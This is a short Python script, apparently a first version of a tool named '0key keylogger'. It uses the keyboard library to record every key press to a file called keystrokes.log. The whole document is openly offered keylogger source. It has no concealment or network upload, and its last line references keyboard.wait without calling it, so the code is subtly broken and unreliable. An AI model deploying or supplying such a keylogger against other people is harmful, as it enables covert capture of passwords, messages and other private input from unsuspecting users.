# python3.12.2
# 0key keylogger 


import keyboard
log_file = "keystrokes.log"

def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(event.name)


keyboard.on_press(on_key_press)
# .wait 
# v0.0.1

keyboard.wait


